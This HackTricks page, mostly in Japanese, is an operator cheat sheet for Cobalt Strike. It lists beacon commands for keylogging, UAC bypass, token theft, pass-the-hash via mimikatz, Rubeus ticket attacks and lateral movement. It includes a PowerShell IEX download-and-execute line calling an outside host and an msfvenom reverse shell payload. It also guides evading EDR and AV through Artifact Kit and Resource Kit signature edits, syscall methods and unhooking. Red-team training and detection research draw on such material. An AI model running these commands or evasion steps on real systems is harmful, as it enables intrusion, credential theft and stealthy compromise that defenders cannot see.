# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` その後、どこでリスンするか、どの種類の beacon を使うか (http, dns, smb...) などを選択できます。

### Peer2Peer Listeners

これらのリスナーの beacon は C2 と直接通信する必要はなく、他の beacon を介して通信できます。

`Cobalt Strike -> Listeners -> Add/Edit` 次に TCP または SMB beacon を選択する必要があります

* The **TCP beacon will set a listener in the port selected**. 別の beacon から TCP beacon に接続するには、`connect <ip> <port>` コマンドを使用します
* The **smb beacon will listen in a pipename with the selected name**. SMB beacon に接続するには `link [target] [pipe]` コマンドを使用します。

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** for HTA files
* **`MS Office Macro`** はマクロ入りの Office ドキュメント用です
* **`Windows Executable`** は .exe、.dll、または service .exe 用です
* **`Windows Executable (S)`** は **stageless** の .exe、.dll、または service .exe 用（stageless の方が staged より良い、IoCs が少ない）

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` これは bitsadmin、exe、powershell、python などの形式で cobalt strike から beacon をダウンロードするためのスクリプト/実行ファイルを生成します

#### Host Payloads

もしホストしたいファイルがすでにウェブサーバにある場合は、`Attacks -> Web Drive-by -> Host File` に行き、ホストするファイルとウェブサーバ設定を選択します。

### Beacon Options

<details>
<summary>Beacon のオプションとコマンド</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### カスタムインプラント / Linux Beacons

- カスタムエージェントは登録/チェックインとタスク受信のために Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) を実装するだけで十分です。プロファイルで定義された同じ URIs/headers/metadata crypto を実装すると、Cobalt Strike UI をタスキングと出力に再利用できます。
- Aggressor Script（例: `CustomBeacon.cna`）は、non-Windows beacon 用のペイロード生成をラップしてオペレータがリスナーを選んで GUI から直接 ELF ペイロードを生成できるようにできます。
- Team Server に公開される例としての Linux タスクハンドラ: `sleep`, `cd`, `pwd`, `shell`（任意コマンド実行）, `ls`, `upload`, `download`, `exit`。これらは Team Server が期待するタスクIDにマップされ、サーバー側で適切なフォーマットで出力を返すよう実装する必要があります。
- BOF サポートは、Beacon Object Files をプロセス内で読み込むために [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader)（Outflank スタイルの BOF もサポート）を使うことで追加できます。これにより、新しいプロセスを生成せずに implant のコンテキスト/権限内でモジュール化された post-exploitation を実行できます。
- カスタム beacon に SOCKS ハンドラを埋め込んで Windows Beacons と同等にピボットできるようにします。オペレータが `socks <port>` を実行したとき、インプラントはローカルプロキシを開いてオペレータのツールを侵害された Linux ホスト経由で内部ネットワークへルーティングするべきです。

## Opsec

### Execute-Assembly

The **`execute-assembly`** は指定されたプログラムを実行するためにリモートプロセスインジェクションを行う **犠牲プロセス** を使用します。プロセス内にインジェクトするために特定の Win APIs が使われるため非常にノイジーで、ほとんどの EDR がこれらを検知しています。しかし、同一プロセス内に何かをロードするために使えるカスタムツールがいくつか存在します:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike では BOF (Beacon Object Files) も使用できます: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

agressor script `https://github.com/outflanknl/HelpColor` は Cobalt Strike に `helpx` コマンドを作成し、コマンドが BOF（緑）、Frok&Run（黄）などか、ProcessExecution・injection 等（赤）かを色で示してくれます。これによりどのコマンドがよりステルスか分かりやすくなります。

### Act as the user

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` のようなイベントを確認できます:

- Security EID 4624 - 通常の対話型ログオン時間帯を把握するためにすべてのインタラクティブログオンを確認する。
- System EID 12,13 - シャットダウン/起動/スリープの頻度を確認する。
- Security EID 4624/4625 - 有効/無効な NTLM のインバウンド試行を確認する。
- Security EID 4648 - 平文資格情報が使われてログオンされたときに作成されます。プロセスがこれを生成した場合、そのバイナリは設定ファイルやコード内に平文資格情報を保持している可能性があります。

cobalt strike の `jump` を使う際は、新しいプロセスをより正当っぽく見せるために `wmi_msbuild` メソッドを使う方が良いです。

### Use computer accounts

防御側はユーザ由来の奇妙な挙動を監視する際に service accounts や `*$` のような computer accounts を監視から除外していることがよくあります。これらのアカウントを横移動や権限昇格に利用できます。

### Use stageless payloads

Stageless payloads はステージをダウンロードする必要がないため、staged なものよりノイズが少ないです。初回接続以降にネットワークトラフィックを生成しないため、ネットワークベースの検知に引っかかりにくくなります。

### Tokens & Token Store

トークンを盗んだり生成したりするときは注意してください。EDR がスレッドのすべてのトークンを列挙して「別のユーザに属するトークン」やプロセス内の SYSTEM トークンを見つける可能性があります。

これを避けるためにトークンを **ビーコン毎に保存** しておくと、同じトークンを何度も盗む必要がなくなります。横移動や複数回使う必要がある場合に有用です:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

横移動する際は、通常は新しいトークンを生成するよりも **トークンを盗む方が良い**、あるいは pass the hash 攻撃を行います。

### Guardrails

Cobalt Strike には Guardrails と呼ばれる機能があり、検知されやすい特定のコマンドやアクションの使用を防止できます。Guardrails は `make_token`, `jump`, `remote-exec` といった横移動や権限昇格でよく使われるコマンドをブロックするよう設定できます。

さらに、リポジトリ [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) には、ペイロードを実行する前に考慮すべきチェックやアイデアが含まれています。

### Tickets encryption

AD 環境ではチケットの暗号化に注意してください。デフォルトで一部ツールは Kerberos チケットに RC4 を使うことがあり、これは AES より弱いです。最新の環境ではデフォルトで AES が使われますが、弱い暗号を使っていると防御側に検出される可能性があります。

### Avoid Defaults

Cobalt Stricke を使うとデフォルトで SMB パイプ名が `msagent_####` や `"status_####` になります。これらの名前は変更してください。既存のパイプ名は Cobal Strike から次のコマンドで確認できます: `ls \\.\pipe\`

また、SSH セッションでは `\\.\pipe\postex_ssh_####` というパイプが作られます。`set ssh_pipename "<new_name>";` で変更してください。

poext exploitation 攻撃でもパイプ `\\.\pipe\postex_####` は `set pipename "<new_name>"` で変更できます。

Cobalt Strike のプロファイルでは以下のような項目も変更できます:

- `rwx` の使用を避ける
- `process-inject {...}` ブロックでプロセスインジェクションの挙動（どの APIs を使うか）を制御する方法
- `post-ex {…}` ブロックでの "fork and run" の動作
- sleep 時間
- メモリにロードするバイナリの最大サイズ
- `stage {...}` ブロックでのメモリフットプリントや DLL コンテンツ
- ネットワークトラフィック

### Bypass memory scanning

一部の ERDs は既知のマルウェアシグネチャをメモリスキャンで検出します。Coblat Strike は `sleep_mask` 関数を BOF として変更でき、メモリ内で backdoor を暗号化することが可能になります。

### Noisy proc injections

プロセスにコードをインジェクトする際は通常非常にノイジーです。通常のプロセスはこのような行為を行わないことと、実行方法が限られているため、振る舞い検知システムに検出されやすいからです。さらに、EDR が「ディスク上にないコードを含むスレッド」をネットワークでスキャンすることで検出される場合もあります（JIT を使うブラウザのようなプロセスは例外的に一般的です）。例: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

新しいプロセスを生成する際は、検出を避けるためにプロセス間の親子関係を**通常通り維持**することが重要です。例えば svchost.exec が iexplorer.exe を実行していると不審に見えます。svchost.exe が通常 iexplorer.exe の親にならないからです。

Cobalt Strike が新しいビーコンをスポーンするとき、デフォルトでは新しいリスナーを実行するために **`rundll32.exe`** を使ったプロセスが作成されます。これはあまりステルスではなく EDR に簡単に検出されます。さらに `rundll32.exe` が引数なしで実行されるためさらに不審です。

With the following Cobalt Strike command, you can specify a different process to spawn the new beacon, making it less detectable:
```bash
spawnto x86 svchost.exe
```
You can aso change this setting **`spawnto_x86` and `spawnto_x64`** in a profile.

### 攻撃者のトラフィックをプロキシする

攻撃者はツールをローカルで実行する必要があることがあり、Linux マシン上でさえツールを動かして被害者のトラフィックをそのツールに到達させることがあります（例：NTLM relay）。

さらに、pass-the.hash や pass-the-ticket 攻撃を行う際、被害者マシンの LSASS プロセスを改変する代わりに、攻撃者が自分のローカル LSASS プロセスにそのハッシュやチケットを追加してからそこからピボットするほうがステルス性が高い場合があります。

ただし、生成されるトラフィックには注意が必要です。backdoor プロセスから珍しいトラフィック（Kerberos など）を送信してしまう可能性があるためです。そのために browser process にピボットすることもできますが、プロセスへインジェクトすることで検知される恐れがあるため、ステルスな方法を検討してください。

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
`dist-pipe\artifact.cna` のような aggressive スクリプトをロードして、Cobalt Strike に既にロードされているリソースではなく、我々が望むディスク上のリソースを使わせることを忘れないでください。

#### Resource Kit

ResourceKit フォルダには、Cobalt Strike のスクリプトベースのペイロード（PowerShell、VBA、HTA を含む）のテンプレートが含まれています。

テンプレートと [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を使うと、防御側（この場合は AMSI）が嫌がる部分を見つけて、それを修正できます：
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
検出された行を修正すれば、検出されないテンプレートを作成できます。

攻撃的なスクリプト `ResourceKit\resources.cna` をロードして、Cobalt Strike にロードされたものではなく、ディスク上の任意のリソースを使用させることを忘れないでください。

#### Function hooks | Syscall

Function hooking は、ERDs が悪意ある活動を検出するための非常に一般的な手法です。Cobalt Strike は、標準の Windows API 呼び出しの代わりに **syscalls** を使用する（**`None`** 設定）ことでこれらのフックを回避したり、関数の `Nt*` バージョンを **`Direct`** 設定で使用したり、malleable profile の **`Indirect`** オプションで `Nt*` 関数を飛び越えたりすることを可能にします。システムによっては、あるオプションの方が他よりステルス性が高い場合があります。

これはプロファイルで設定するか、コマンド **`syscall-method`** を使用して設定できます。

ただし、これはノイズが多くなることもあります。

Cobalt Strike が提供する function hooks を回避するオプションの一つは、これらのフックを [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) で削除することです。

どの関数がフックされているかは [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) または [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) で確認できます。




<details>
<summary>その他の Cobalt Strike コマンド</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## 参考資料

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
